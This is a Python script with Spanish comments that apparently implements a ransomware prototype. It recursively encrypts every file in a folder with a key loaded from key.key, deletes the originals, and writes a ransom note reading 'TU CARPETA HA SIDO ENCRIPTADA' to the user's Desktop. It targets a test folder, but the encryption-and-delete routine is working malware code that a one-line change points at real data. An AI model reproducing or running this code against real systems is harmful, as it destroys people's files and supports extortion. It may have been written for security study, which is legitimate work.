from cryptography.fernet import Fernet
import os
import sys

if getattr(sys, "frozen", False):
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

KEY_FILE = os.path.join(BASE_DIR, "key.key")

TARGET_FOLDER = os.path.join(BASE_DIR, "carpeta_prueba")

def load_key():
    # Carga la clave desde key.key
    with open(KEY_FILE, "rb") as file:
        return file.read()


def encrypt_file(file_path, cipher):
    #Cifra un archivo individual

    # Leer contenido original
    with open(file_path, "rb") as file:
        data = file.read()

    # Cifrar contenido
    encrypted_data = cipher.encrypt(data)

    # Guardar archivo cifrado
    encrypted_path = file_path + ".encrypted"

    with open(encrypted_path, "wb") as file:
        file.write(encrypted_data)

    # Eliminar el original
    os.remove(file_path)

    print(f"Cifrado: {file_path}")


def encrypt_folder(folder_path, cipher):
    # Recorre la carpeta y cifra los archivos

    for root, directories, files in os.walk(folder_path):

        for file in files:

            file_path = os.path.join(root, file)

            # Evitar cifrar archivos ya cifrados
            if not file.endswith(".encrypted"):
                encrypt_file(file_path, cipher)


if __name__ == "__main__":

    # Verificar existencia de la clave
    if not os.path.exists(KEY_FILE):
        print("No existe key.key. Primero genera la clave.")
        exit()

    # Verificar carpeta
    if not os.path.exists(TARGET_FOLDER):
        print("La carpeta indicada no existe.")
        exit()


    key = load_key()

    cipher = Fernet(key)

    encrypt_folder(TARGET_FOLDER, cipher)

    print("\nProceso terminado.")

# Obtener la ruta del escritorio
desktop = os.path.join(os.path.expanduser("~"), "Desktop")

# Nombre y ruta del archivo
file_path = os.path.join(desktop, "README_RANS.txt")

# Crear el archivo y escribir contenido
with open(file_path, "w", encoding="utf-8") as file:
    file.write("TU CARPETA HA SIDO ENCRIPTADA.\n")
    file.write("SIGUE LAS INSTRUCCIONES PARA RECUPERAR TUS ARCHIVOS.\n")

print(f"Archivo creado correctamente en: {file_path}")